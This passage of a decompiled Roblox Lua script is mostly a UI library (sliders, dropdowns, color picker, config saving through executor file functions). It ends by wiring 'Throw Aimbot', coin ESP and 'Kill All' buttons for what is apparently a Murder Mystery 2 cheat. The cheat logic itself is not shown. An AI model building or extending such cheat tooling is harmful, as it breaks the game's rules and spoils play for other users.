						Position = value206 and UDim2.new(0, 23, 0.5, 0) or UDim2.new(0, 3, 0.5, 0),
					}

					tbl111[value205] = { Transparency = 1 }
					tbl111[value204] = { TextColor3 = value206 and tbl90.text or tbl90.sub }

					for k, value207 in pairs(tbl111) do
						if param189 then
							func185(k, 0.22, value207)
						else
							for k2, value208 in pairs(value207) do
								k[k2] = value208
							end
						end
					end
				end

				func226(false)

				tbl110.Set = function(param190, flag237)
					tbl110.Value = flag237 == true
					func226(true)
					func186(param188.Callback, tbl110.Value)
				end

				tbl110._load = function(param191, param192)
					tbl110:Set(param192)
				end

				tbl110._save = function()
					return tbl110.Value
				end

				value203.Activated:Connect(function()
					if tbl110.Locked then
						return
					end
					tbl110:Set(not tbl110.Value)
				end)

				return func220(tbl110, param188.Flag)
			end

			tbl109.Slider = function(param193, param194)
				local value209 = param194.Value or {}
				local n10 = tonumber(value209.Min) or 0
				local n11 = tonumber(value209.Max) or 100
				local n12 = tonumber(param194.Step) or 1
				local value210 = func222(64)
				func224(value210, param194.Title, 90).Size = UDim2.new(1, -110, 0, 38)

				local value211 = func225(value210, {
					Class = "TextBox",
					Anchor = Vector2.new(1, 0),
					Position = UDim2.new(1, -16, 0, 8),
					Size = UDim2.fromOffset(0, 24),
					Radius = 7,
				})

				value211.ClearTextOnFocus = false
				value211.FontFace = func179(fontWeight.SemiBold)
				value211.TextSize = 13
				value211.TextColor3 = tbl90.text
				value211.Text = ""
				func180("UIPadding", { PaddingLeft = UDim.new(0, 9), PaddingRight = UDim.new(0, 9), Parent = value211 })

				local Frame26 = func180("Frame", {
					BackgroundColor3 = tbl90.track,
					Position = UDim2.new(0, 18, 0, 45),
					Size = UDim2.new(1, -36, 0, 6),
					Parent = value210,
				})

				func181(Frame26, 3)
				local Frame27 = func180("Frame", { BackgroundColor3 = tbl90.accent, Size = UDim2.fromScale(0, 1), Parent = Frame26 })
				func181(Frame27, 3)

				local Frame28 = func180("Frame", {
					BackgroundColor3 = color2,
					AnchorPoint = Vector2.new(0.5, 0.5),
					Position = UDim2.fromScale(0, 0.5),
					Size = UDim2.fromOffset(16, 16),
					ZIndex = 2,
					Parent = Frame26,
				})

				func181(Frame28, 8)
				func182(Frame28, tbl90.card).Thickness = 3

				local TextButton4 = func180("TextButton", {
					Text = "",
					AutoButtonColor = false,
					BackgroundTransparency = 1,
					Position = UDim2.new(0, 8, 0, 34),
					Size = UDim2.new(1, -16, 0, 26),
					ZIndex = 3,
					Parent = value210,
				})

				local tbl112 = { Type = "Slider", Flag = param194.Flag, ElementFrame = value210 }

				local function func227(param195)
					local n13 = math.clamp(n10 + math.floor((math.clamp(tonumber(param195) or n10, n10, n11) - n10) / n12 + 0.5) * n12, n10, n11)
					return tonumber(func195(n13, n12)) or n13
				end

				tbl112.Value = func227(value209.Default or n10)

				local function func228(param196)
					local n13 = n11 > n10 and (tbl112.Value - n10) / (n11 - n10) or 0

					if param196 then
						func185(Frame27, 0.12, { Size = UDim2.fromScale(n13, 1) })
						func185(Frame28, 0.12, { Position = UDim2.fromScale(n13, 0.5) })
					else
						local value212 = Frame27
						local value213 = Frame28
						local udim2 = UDim2.fromScale(n13, 1)
						local udim22 = UDim2.fromScale(n13, 0.5)
						value212.Size = udim2
						value213.Position = udim22
					end

					value211.Text = func195(tbl112.Value, n12)
				end

				func228(false)

				tbl112.Set = function(param197, param198, flag238)
					local flag239 = func227(param198)
					local flag240 = flag239 ~= tbl112.Value
					tbl112.Value = flag239
					func228(true)

					if not flag238 or flag240 then
						func186(param194.Callback, tbl112.Value)
					end
				end

				tbl112._load = function(param199, param200)
					tbl112:Set(param200)
				end

				tbl112._save = function()
					return tbl112.Value
				end

				local function func229(num65)
					local num66 = func227(n10 + (n11 - n10) * math.clamp((num65 - Frame26.AbsolutePosition.X) / math.max(Frame26.AbsoluteSize.X, 1), 0, 1))

					if num66 ~= tbl112.Value then
						tbl112:Set(num66)
					end
				end

				func190(TextButton4, function(param201)
					func229(param201.X)
					func185(Frame28, 0.12, { Size = UDim2.fromOffset(20, 20) })
				end, function(param202)
					func229(param202.X)
				end, function()
					func185(Frame28, 0.12, { Size = UDim2.fromOffset(16, 16) })
				end)

				value211.FocusLost:Connect(function()
					local text3 = tonumber(value211.Text)

					if text3 then
						tbl112:Set(text3)
					else
						func228(false)
					end
				end)

				return func220(tbl112, param194.Flag)
			end

			tbl109.Button = function(param203, param204)
				local value214 = func222(48)
				local value215 = func223(value214)
				local color3 = typeof(param204.Color) == "Color3" and param204.Color or nil
				local value216 = func224(value214, param204.Title, 50)

				if color3 then
					value216.TextColor3 = color3
				end

				local func230 = func180
				local tbl113 = { BackgroundColor3 = color3 or color2 }
				tbl113.AnchorPoint = Vector2.new(1, 0.5)
				tbl113.Position = UDim2.new(1, -16, 0.5, 0)
				tbl113.Size = UDim2.fromOffset(30, 30)
				tbl113.ZIndex = 2
				tbl113.Parent = value214
				local Frame26 = func230("Frame", tbl113)
				func181(Frame26, 15)
				func184(Frame26, param204.Icon or "chevron-right", 15, color3 and color2 or tbl90.ink, { Anchor = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Z = 2 })
				local UIScale3 = func180("UIScale", { Parent = Frame26 })

				value215.MouseEnter:Connect(function()
					func185(UIScale3, 0.15, { Scale = 1.08 })
				end)

				value215.MouseLeave:Connect(function()
					func185(UIScale3, 0.15, { Scale = 1 })
				end)

				value215.Activated:Connect(function()
					UIScale3.Scale = 0.85
					func185(UIScale3, 0.3, { Scale = 1 })
					func186(param204.Callback)
				end)

				return { Type = "Button", ElementFrame = value214 }
			end

			tbl109.Paragraph = function(param205, param206)
				local value217 = func222(0)
				value217.AutomaticSize = Enum.AutomaticSize.Y

				local Frame26 = func180("Frame", {
					BackgroundTransparency = 1,
					Size = UDim2.new(1, 0, 0, 0),
					AutomaticSize = Enum.AutomaticSize.Y,
					Parent = value217,
				})

				func180("UIPadding", {
					PaddingTop = UDim.new(0, 13),
					PaddingBottom = UDim.new(0, 13),
					PaddingLeft = UDim.new(0, 18),
					PaddingRight = UDim.new(0, 18),
					Parent = Frame26,
				})

				func180("UIListLayout", { Padding = UDim.new(0, 3), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame26 })

				local value218 = func183(Frame26, {
					Text = param206.Title or "",
					Size = 15,
					Weight = fontWeight.SemiBold,
					Box = UDim2.new(1, 0, 0, 0),
					AutoY = true,
					Wrap = true,
				})

				value218.LayoutOrder = 1

				local value219 = func183(Frame26, {
					Text = param206.Desc or "",
					Size = 13,
					Color = tbl90.sub,
					Box = UDim2.new(1, 0, 0, 0),
					AutoY = true,
					Wrap = true,
					AlignY = Enum.TextYAlignment.Top,
				})

				value219.LayoutOrder = 2
				value219.Visible = (param206.Desc or "") ~= ""

				return {
					Type = "Paragraph",
					ElementFrame = value217,
					SetTitle = function(param207, flag241)
						value218.Text = tostring(flag241 or "")
					end,
					SetDesc = function(param208, flag242)
						value219.Text = tostring(flag242 or "")
						value219.Visible = value219.Text ~= ""
					end,
				}
			end

			tbl109.Input = function(param209, param210)
				local value220 = func222(84)
				func224(value220, param210.Title).Size = UDim2.new(1, -36, 0, 38)

				local obj38 = func225(value220, {
					Class = "TextBox",
					Anchor = Vector2.zero,
					Position = UDim2.new(0, 16, 0, 38),
					Size = UDim2.new(1, -32, 0, 34),
					Auto = Enum.AutomaticSize.None,
				})

				obj38.ClearTextOnFocus = false
				obj38.FontFace = func179(fontWeight.Regular)
				obj38.TextSize = 13
				obj38.TextColor3 = tbl90.text
				obj38.PlaceholderText = param210.Placeholder or ""
				obj38.PlaceholderColor3 = tbl90.dim
				obj38.Text = param210.Value or ""
				obj38.TextXAlignment = Enum.TextXAlignment.Left
				obj38.TextTruncate = Enum.TextTruncate.AtEnd
				local uiStroke = obj38:FindFirstChildWhichIsA("UIStroke")
				func180("UIPadding", { PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 12), Parent = obj38 })
				local obj39

				obj39 = {
					Type = "Input",
					Flag = param210.Flag,
					Value = param210.Value or "",
					ElementFrame = value220,
					Set = function(param211, flag243)
						obj39.Value = tostring(flag243 or "")
						obj38.Text = obj39.Value
						func186(param210.Callback, obj39.Value)
					end,
					_load = function(param212, param213)
						obj39:Set(param213)
					end,
					_save = function()
						return obj39.Value
					end,
				}

				obj38.Focused:Connect(function()
					func185(uiStroke, 0.15, { Color = tbl90.sub })
				end)

				obj38.FocusLost:Connect(function()
					func185(uiStroke, 0.15, { Color = tbl90.cardLine })

					if obj38.Text ~= obj39.Value then
						obj39:Set(obj38.Text)
					end
				end)

				func186(param210.Callback, obj39.Value)
				return func220(obj39, param210.Flag)
			end

			tbl109.Dropdown = function(param214, param215)
				local value221 = func222(48)
				func224(value221, param215.Title, 180)
				local value222 = func225(value221, { Position = UDim2.new(1, -14, 0.5, 0), Size = UDim2.fromOffset(0, 32) })
				func180("UIPadding", { PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 9), Parent = value222 })

				func180("UIListLayout", {
					FillDirection = Enum.FillDirection.Horizontal,
					VerticalAlignment = Enum.VerticalAlignment.Center,
					Padding = UDim.new(0, 8),
					SortOrder = Enum.SortOrder.LayoutOrder,
					Parent = value222,
				})

				local value223 = func183(value222, { Size = 14, Weight = fontWeight.SemiBold, Box = UDim2.fromOffset(0, 32), AutoX = true })
				func180("UISizeConstraint", { MaxSize = Vector2.new(150, 32), Parent = value223 })
				value223.LayoutOrder = 1
				local Frame26 = func180("Frame", { BackgroundColor3 = color2, Size = UDim2.fromOffset(18, 18), LayoutOrder = 2, Parent = value222 })
				func181(Frame26, 9)
				func184(Frame26, "chevron-down", 12, tbl90.ink, tbl93)

				local tbl114 = {
					Type = "Dropdown",
					Flag = param215.Flag,
					Values = param215.Values or {},
					Value = param215.Value,
					ElementFrame = value221,
				}

				local function func231()
					value223.Text = tbl114.Value ~= nil and tostring(tbl114.Value) or "None"
				end

				func231()

				tbl114.Select = function(param216, value224)
					tbl114.Value = value224
					func231()
					func186(param215.Callback, value224)
				end

				tbl114.Set = tbl114.Select

				tbl114.Refresh = function(param217, values)
					tbl114.Values = values or {}
					func231()
				end

				tbl114._load = function(param218, param219)
					tbl114:Select(param219)
				end

				tbl114._save = function()
					return tbl114.Value
				end

				value222.Activated:Connect(function()
					local num67 = func211(value222, 210, math.min(#tbl114.Values, 7) * 34 + 10)

					local ScrollingFrame3 = func180("ScrollingFrame", {
						BackgroundTransparency = 1,
						Size = UDim2.fromScale(1, 1),
						CanvasSize = UDim2.new(),
						AutomaticCanvasSize = Enum.AutomaticSize.Y,
						ScrollBarThickness = 2,
						ScrollBarImageColor3 = tbl90.dim,
						ZIndex = 2,
						Parent = num67,
					})

					func180("UIPadding", {
						PaddingTop = UDim.new(0, 5),
						PaddingBottom = UDim.new(0, 5),
						PaddingLeft = UDim.new(0, 5),
						PaddingRight = UDim.new(0, 5),
						Parent = ScrollingFrame3,
					})

					func180("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame3 })

					for i, value225 in ipairs(tbl114.Values) do
						local flag244 = value225 == tbl114.Value

						local TextButton4 = func180("TextButton", {
							Text = "",
							AutoButtonColor = false,
							BackgroundColor3 = flag244 and color2 or tbl90.hover,
							BackgroundTransparency = flag244 and 0 or 1,
							Size = UDim2.new(1, 0, 0, 34),
							LayoutOrder = i,
							ZIndex = 2,
							Parent = ScrollingFrame3,
						})

						func181(TextButton4, 8)

						func183(TextButton4, {
							Text = tostring(value225),
							Size = 14,
							Weight = flag244 and fontWeight.SemiBold or fontWeight.Regular,
							Color = flag244 and tbl90.ink or tbl90.text,
							Position = UDim2.fromOffset(12, 0),
							Box = UDim2.new(1, -40, 1, 0),
							Z = 2,
						})

						if flag244 then
							func184(TextButton4, "check", 14, tbl90.ink, { Anchor = Vector2.new(1, 0.5), Position = UDim2.new(1, -10, 0.5, 0), Z = 2 })
						end

						TextButton4.MouseEnter:Connect(function()
							if not flag244 then
								func185(TextButton4, 0.12, { BackgroundTransparency = 0 })
							end
						end)

						TextButton4.MouseLeave:Connect(function()
							if not flag244 then
								func185(TextButton4, 0.12, { BackgroundTransparency = 1 })
							end
						end)

						TextButton4.Activated:Connect(function()
							closePopup()
							tbl114:Select(value225)
						end)
					end
				end)

				if tbl114.Value ~= nil then
					func186(param215.Callback, tbl114.Value)
				end

				return func220(tbl114, param215.Flag)
			end

			tbl109.Keybind = function(param220, param221)
				local value226 = func222(48)
				func224(value226, param221.Title, 120)
				local obj40 = func225(value226, { Size = UDim2.fromOffset(0, 30) })
				func180("UIPadding", { PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 12), Parent = obj40 })

				local value227 = func183(obj40, {
					Size = 13,
					Weight = fontWeight.Bold,
					Box = UDim2.fromOffset(0, 30),
					AutoX = true,
					AlignX = Enum.TextXAlignment.Center,
				})

				local uiStroke = obj40:FindFirstChildWhichIsA("UIStroke")
				local tbl115 = { Type = "Keybind", Flag = param221.Flag, Value = param221.Value, ElementFrame = value226 }

				local function func232()
					value227.Text = tostring(tbl115.Value or "None")
				end

				func232()

				tbl115.Set = function(param222, param223)
					local name

					if typeof(param223) == "EnumItem" then
						name = param223.Name
					else
						name = param223
					end

					tbl115.Value = name
					func232()
					func186(param221.Callback, name)
				end

				tbl115._load = function(param224, param225)
					tbl115:Set(param225)
				end

				tbl115._save = function()
					return tbl115.Value
				end

				local flag245 = false
				local connection2 = nil

				obj40.Activated:Connect(function()
					if flag245 then
						return
					end
					flag245 = true
					value227.Text = "Press a key"
					func185(obj40, 0.15, { BackgroundColor3 = color2 })
					func185(value227, 0.15, { TextColor3 = tbl90.ink })
					func185(uiStroke, 0.15, { Color = color2 })

					connection2 = UserInputService2.InputBegan:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.Keyboard then
							return
						end
						connection2:Disconnect()
						flag245 = false
						func185(obj40, 0.15, { BackgroundColor3 = tbl90.field })
						func185(value227, 0.15, { TextColor3 = tbl90.text })
						func185(uiStroke, 0.15, { Color = tbl90.cardLine })
						if input.KeyCode == Enum.KeyCode.Escape then
							func232()
							return
						end
						tbl115:Set(input.KeyCode.Name)
					end)
				end)

				return func220(tbl115, param221.Flag)
			end

			tbl109.Colorpicker = function(param226, param227)
				local value228 = func222(48)
				func224(value228, param227.Title, 80)
				local func233 = func180
				local tbl116 = { Text = "", AutoButtonColor = false, BackgroundColor3 = param227.Default or color2 }
				tbl116.AnchorPoint = Vector2.new(1, 0.5)
				tbl116.Position = UDim2.new(1, -16, 0.5, 0)
				tbl116.Size = UDim2.fromOffset(30, 30)
				tbl116.Parent = value228
				local TextButton4 = func233("TextButton", tbl116)
				func181(TextButton4, 15)
				func182(TextButton4, tbl90.cardLine).Thickness = 3
				local obj41

				obj41 = {
					Type = "Colorpicker",
					Flag = param227.Flag,
					Value = param227.Default or color2,
					ElementFrame = value228,
					Update = function(param228, value229)
						if typeof(value229) ~= "Color3" then
							return
						end
						obj41.Value = value229
						TextButton4.BackgroundColor3 = value229
					end,
					Set = function(param229, param230)
						if typeof(param230) ~= "Color3" then
							return
						end
						obj41:Update(param230)
						func186(param227.Callback, param230)
					end,
					_load = function(param231, param232)
						local ok, result = pcall(Color3.fromHex, tostring(param232))

						if ok and result then
							obj41:Set(result)
						end
					end,
					_save = function()
						return obj41.Value:ToHex()
					end,
				}

				TextButton4.Activated:Connect(function()
					local value230 = func211(TextButton4, 240, 240)

					func180("UIPadding", {
						PaddingTop = UDim.new(0, 12),
						PaddingLeft = UDim.new(0, 12),
						PaddingRight = UDim.new(0, 12),
						Parent = value230,
					})

					local n10, n11, n12 = obj41.Value:ToHSV()

					local Frame26 = func180("Frame", {
						BackgroundColor3 = Color3.fromHSV(n10, 1, 1),
						Size = UDim2.new(1, 0, 0, 150),
						ZIndex = 2,
						Parent = value230,
					})

					func181(Frame26, 9)
					local Frame27 = func180("Frame", { BackgroundColor3 = color2, Size = UDim2.fromScale(1, 1), ZIndex = 2, Parent = Frame26 })
					func181(Frame27, 9)
					func180("UIGradient", { Transparency = NumberSequence.new(0, 1), Parent = Frame27 })
					local Frame28 = func180("Frame", { BackgroundColor3 = Color3.new(0, 0, 0), Size = UDim2.fromScale(1, 1), ZIndex = 2, Parent = Frame26 })
					func181(Frame28, 9)
					func180("UIGradient", { Rotation = 90, Transparency = NumberSequence.new(1, 0), Parent = Frame28 })

					local Frame29 = func180("Frame", {
						BackgroundTransparency = 1,
						AnchorPoint = Vector2.new(0.5, 0.5),
						Size = UDim2.fromOffset(14, 14),
						ZIndex = 3,
						Parent = Frame26,
					})

					func181(Frame29, 7)
					func182(Frame29, color2).Thickness = 2

					local Frame30 = func180("Frame", {
						BackgroundColor3 = color2,
						Position = UDim2.fromOffset(0, 162),
						Size = UDim2.new(1, 0, 0, 12),
						ZIndex = 2,
						Parent = value230,
					})

					func181(Frame30, 6)
					local list40 = {}

					for i = 0, 6 do
						list40[#list40 + 1] = ColorSequenceKeypoint.new(i / 6, Color3.fromHSV(i / 6 % 1, 1, 1))
					end

					func180("UIGradient", { Color = ColorSequence.new(list40), Parent = Frame30 })

					local Frame31 = func180("Frame", {
						BackgroundColor3 = color2,
						AnchorPoint = Vector2.new(0.5, 0.5),
						Size = UDim2.fromOffset(8, 18),
						ZIndex = 3,
						Parent = Frame30,
					})

					func181(Frame31, 4)
					func182(Frame31, tbl90.cardLine)

					local TextBox2 = func180("TextBox", {
						BackgroundColor3 = tbl90.field,
						Position = UDim2.fromOffset(0, 188),
						Size = UDim2.new(1, -42, 0, 30),
						ClearTextOnFocus = false,
						FontFace = func179(fontWeight.SemiBold),
						TextSize = 13,
						TextColor3 = tbl90.text,
						ZIndex = 2,
						Parent = value230,
					})

					func181(TextBox2, 8)
					func182(TextBox2, tbl90.cardLine)

					local Frame32 = func180("Frame", {
						AnchorPoint = Vector2.new(1, 0),
						Position = UDim2.new(1, 0, 0, 188),
						Size = UDim2.fromOffset(34, 30),
						ZIndex = 2,
						Parent = value230,
					})

					func181(Frame32, 8)
					func182(Frame32, tbl90.cardLine)

					local function func234(param233)
						local color3 = Color3.fromHSV(n10, n11, n12)
						Frame26.BackgroundColor3 = Color3.fromHSV(n10, 1, 1)
						Frame29.Position = UDim2.fromScale(n11, 1 - n12)
						Frame31.Position = UDim2.fromScale(n10, 0.5)
						TextBox2.Text = "#" .. color3:ToHex():upper()
						Frame32.BackgroundColor3 = color3

						if param233 then
							obj41:Set(color3)
						end
					end

					func234(false)

					local function func235(param234)
						n11 = math.clamp((param234.X - Frame26.AbsolutePosition.X) / Frame26.AbsoluteSize.X, 0, 1)
						n12 = 1 - math.clamp((param234.Y - Frame26.AbsolutePosition.Y) / Frame26.AbsoluteSize.Y, 0, 1)
						func234(true)
					end

					local obj42 = func190(func180("TextButton", { Text = "", BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ZIndex = 4, Parent = Frame26 }), func235, func235)

					local function func236(param235)
						n10 = math.clamp((param235.X - Frame30.AbsolutePosition.X) / Frame30.AbsoluteSize.X, 0, 0.999)
						func234(true)
					end

					local obj43 = func190(func180("TextButton", {
						Text = "",
						BackgroundTransparency = 1,
						Size = UDim2.new(1, 0, 1, 8),
						Position = UDim2.fromOffset(0, -4),
						ZIndex = 4,
						Parent = Frame30,
					}), func236, func236)

					TextBox2.FocusLost:Connect(function()
						local func237 = pcall
						local color3 = Color3.fromHex
						local str10 = TextBox2.Text:gsub("#", "")
						local flag246, obj44 = func237(color3, str10)

						if flag246 and obj44 then
							local value231, value232, value233 = obj44:ToHSV()
							n10 = value231
							n11 = value232
							n12 = value233
							func234(true)
						else
							func234(false)
						end
					end)

					value230.Destroying:Connect(function()
						obj42:Disconnect()
						obj43:Disconnect()
					end)
				end)

				return func220(obj41, param227.Flag)
			end

			return tbl109
		end

		tbl98.Dialog = function(param236, param237)
			return { Show = function()
				closePopup()

				local TextButton4 = func180("TextButton", {
					Text = "",
					AutoButtonColor = false,
					BackgroundColor3 = Color3.new(0, 0, 0),
					BackgroundTransparency = 1,
					Size = UDim2.fromScale(1, 1),
					Parent = StarUI_Overlay,
				})

				func185(TextButton4, 0.2, { BackgroundTransparency = 0.45 })

				local Frame24 = func180("Frame", {
					BackgroundColor3 = tbl90.card,
					AnchorPoint = Vector2.new(0.5, 0.5),
					Position = UDim2.fromScale(0.5, 0.5),
					Size = UDim2.fromOffset(350, 0),
					AutomaticSize = Enum.AutomaticSize.Y,
					Parent = TextButton4,
				})

				func180("UIScale", { Scale = UIScale.Scale, Parent = Frame24 })
				func181(Frame24, 16)
				func182(Frame24, tbl90.cardLine)

				func180("UIPadding", {
					PaddingTop = UDim.new(0, 20),
					PaddingBottom = UDim.new(0, 20),
					PaddingLeft = UDim.new(0, 20),
					PaddingRight = UDim.new(0, 20),
					Parent = Frame24,
				})

				func180("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame24 })
				local Frame25 = func180("Frame", { BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 32), LayoutOrder = 1, Parent = Frame24 })

				if param237.Icon then
					local Frame26 = func180("Frame", {
						BackgroundColor3 = color2,
						AnchorPoint = Vector2.new(0, 0.5),
						Position = UDim2.new(0, 0, 0.5, 0),
						Size = UDim2.fromOffset(32, 32),
						Parent = Frame25,
					})

					func181(Frame26, 10)
					func184(Frame26, param237.Icon, 16, tbl90.ink, tbl93)
				end

				func183(Frame25, {
					Text = param237.Title or "",
					Size = 18,
					Weight = fontWeight.Bold,
					Position = UDim2.fromOffset(param237.Icon and 42 or 0, 0),
					Box = UDim2.new(1, -42, 1, 0),
				})

				func183(Frame24, {
					Text = param237.Content or "",
					Size = 14,
					Color = tbl90.sub,
					Wrap = true,
					Box = UDim2.new(1, 0, 0, 0),
					AutoY = true,
					AlignY = Enum.TextYAlignment.Top,
				}).LayoutOrder = 2

				local Frame26 = func180("Frame", { BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 46), LayoutOrder = 3, Parent = Frame24 })

				func180("UIListLayout", {
					FillDirection = Enum.FillDirection.Horizontal,
					HorizontalAlignment = Enum.HorizontalAlignment.Right,
					VerticalAlignment = Enum.VerticalAlignment.Bottom,
					Padding = UDim.new(0, 8),
					SortOrder = Enum.SortOrder.LayoutOrder,
					Parent = Frame26,
				})

				local function func238()
					pcall(function()
						TextButton4:Destroy()
					end)
				end

				local func239 = ipairs
				local buttons = param237.Buttons or {}

				for k, button in func239(buttons) do
					local variant = button.Variant == "Primary"

					local TextButton5 = func180("TextButton", {
						Text = "",
						AutoButtonColor = false,
						BackgroundColor3 = variant and color2 or tbl90.field,
						Size = UDim2.fromOffset(0, 36),
						AutomaticSize = Enum.AutomaticSize.X,
						LayoutOrder = k,
						Parent = Frame26,
					})

					func181(TextButton5, 18)

					if not variant then
						func182(TextButton5, tbl90.cardLine)
					end

					func180("UIPadding", { PaddingLeft = UDim.new(0, 18), PaddingRight = UDim.new(0, 18), Parent = TextButton5 })

					func183(TextButton5, {
						Text = button.Title or "OK",
						Size = 14,
						Weight = fontWeight.SemiBold,
						Color = variant and tbl90.ink or tbl90.text,
						Box = UDim2.fromOffset(0, 36),
						AutoX = true,
					})

					TextButton5.Activated:Connect(function()
						func238()
						func186(button.Callback)
					end)
				end
			end }
		end

		tbl98.ConfigManager = {}

		tbl98.ConfigManager.CreateConfig = function(param238, str11)
			local str12 = "WindUI/" .. (tbl97.Folder or "StarHub") .. "/config"
			local str13 = str12 .. "/" .. str11 .. ".json"

			local function func240()
				local ok, result = pcall(function()
					return HttpService:JSONDecode(readfile(str13))
				end)

				return ok and type(result) == "table" and result or nil
			end

			return {
				Elements = tbl98.Flags,
				Path = str13,
				Save = function()
					local tbl117 = func240() or {}
					local tbl118 = {}

					for k, flag247 in pairs(tbl98.Flags) do
						if flag247._save then
							local ok, result = pcall(flag247._save)

							if ok and result ~= nil then
								tbl118[k] = { __type = flag247.Type, value = result }
							end
						end
					end

					local func241 = pairs
					local elements = tbl117.__elements or {}

					for k, element in func241(elements) do
						if tbl118[k] == nil and tbl98.Flags[k] == nil then
							tbl118[k] = element
						end
					end

					local tbl119 = {
						__version = tbl117.__version or 1,
						__autoload = tbl117.__autoload,
						__elements = tbl118,
						__custom = tbl117.__custom or {},
					}

					pcall(function()
						if not isfolder("WindUI") then
							makefolder("WindUI")
						end

						if not isfolder("WindUI/" .. (tbl97.Folder or "StarHub")) then
							makefolder("WindUI/" .. (tbl97.Folder or "StarHub"))
						end

						if not isfolder(str12) then
							makefolder(str12)
						end
					end)

					writefile(str13, HttpService:JSONEncode(tbl119))
				end,
				Load = function()
					local result21 = func240()

					if not result21 then
						error("no saved config")
					end

					local func242 = pairs
					local elements = result21.__elements or {}

					for k, element in func242(elements) do
						local flag248 = tbl98.Flags[k]

						if flag248 and flag248._load and type(element) == "table" and element.value ~= nil then
							local ok, result = pcall(flag248._load, flag248, element.value)

							if not ok then
								warn("[Star UI] could not load " .. k .. ": " .. tostring(result))
							end
						end
					end
				end,
			}
		end

		return tbl98
	end

	tbl91.SetTheme = function()
	end

	tbl91.AddTheme = function()
	end

	tbl91.OnThemeChange = function()
	end

	return tbl91
end

_G.StarUI = func178()
local starUI
starUI = _G.StarUI
_G.WindUI = starUI
pcall(_G.__ApplyActionButtonIcons)
_G.__ThemePainters = {}

_G.__ThemeColor = function(param239, param240)
	local theme = starUI.Theme
	local obj45 = theme and theme[param239]

	for i = 1, 6 do
		if not (type(obj45) ~= "string" or obj45:sub(1, 1) == "#") then
			obj45 = theme[obj45]
			continue
		end
		break
	end

	if type(obj45) == "string" then
		local ok, result = pcall(Color3.fromHex, obj45)
		obj45 = ok and result or nil
	elseif type(obj45) == "table" and typeof(obj45.Color) == "ColorSequence" then
		obj45 = obj45.Color.Keypoints[1].Value
	end


	return typeof(obj45) == "Color3" and obj45 or param240
end

_G.__ThemeSequence = function(param241)
	local theme = starUI.Theme and starUI.Theme[param241]
	if type(theme) == "table" and typeof(theme.Color) == "ColorSequence" then
		return theme.Color, theme.Rotation
	end
end

_G.__OnTheme = function(param242)
	table.insert(_G.__ThemePainters, param242)
	pcall(param242)
end

pcall(function()
	starUI:OnThemeChange(function()
		for _, themePainter in ipairs(_G.__ThemePainters) do
			pcall(themePainter)
		end
	end)
end)

_G.WindNotify = function(param243, param244, param245)
	pcall(function()
		local value234 = starUI
		local notify = value234.Notify
		local tbl120 = { Title = param243, Content = param244, Duration = 2.5 }
		local value235 = param245
		local icon

		if param245 then
			icon = value235
		else
			icon = "info"
		end

		tbl120.Icon = icon
		notify(value234, tbl120)
	end)
end

do
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegThrowAimbot"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 96
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Enabled = false
	screenGui.Parent = func2()
	_G.ThrowAimbotGui = screenGui
	local textButton = Instance.new("TextButton")
	textButton.Name = "ThrowAimbot"
	textButton.AnchorPoint = Vector2.new(0, 0.5)
	textButton.Position = UDim2.new(0, 500, 0.38, 84)
	_G.__TrackButtonPosition("ThrowKnife", textButton)
	textButton.Active = true
	textButton.Parent = screenGui
	local value236 = _G.__StyleSquareButton(textButton, "__mm2_throw_knife", "THROW\nKNIFE", Color3.fromRGB(255, 48, 70))
	_G.ThrowAimbotButtonEnabled = false

	_G.ThrowAimbotButtonSetEnabled = function(flag249)
		_G.ThrowAimbotButtonEnabled = flag249 and true or false
		screenGui.Enabled = _G.ThrowAimbotButtonEnabled
	end

	textButton.MouseEnter:Connect(function()
		TweenService:Create(value236, TweenInfo.new(0.13), { Color = Color3.fromRGB(255, 120, 135), Transparency = 0 }):Play()
	end)

	textButton.MouseLeave:Connect(function()
		TweenService:Create(value236, TweenInfo.new(0.13), { Color = Color3.fromRGB(255, 48, 70), Transparency = 0.15 }):Play()
	end)

	local flag250 = false
	local flag251 = false
	local position = nil
	local position2 = nil
	local value237 = nil

	textButton.InputBegan:Connect(function(input)
		if _G.LockButtonsEnabled then
			return
		end

		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag250 = true
			flag251 = false
			position = input.Position
			position2 = textButton.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag250 = false
				end
			end)
		end
	end)

	textButton.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			value237 = input
		end
	end)

	table.insert(_G.CoinESPConn, UserInputService.InputChanged:Connect(function(input)
		if flag250 and input == value237 then
			local n2 = input.Position - position

			if n2.Magnitude > 6 then
				flag251 = true
			end

			textButton.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n2.X, position2.Y.Scale, position2.Y.Offset + n2.Y)
		end
	end))

	local flag252 = false

	textButton.Activated:Connect(function()
		if flag251 or flag252 then
			return
		end
		flag252 = true
		local value238, value239 = _G.ThrowAimbotOnce()

		if _G.WindNotify then
			if value238 then
				_G.WindNotify("Throw Aimbot", "Knife thrown.", "circle-check")
			else
				_G.WindNotify("Throw Aimbot", tostring(value239), "circle-x")
			end
		end

		flag252 = false
	end)
end

do
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "MarbegKillAll"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 97
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Enabled = false
	screenGui.Parent = func2()
	_G.KillAllGui = screenGui
	local textButton = Instance.new("TextButton")
	textButton.Name = "KillAll"
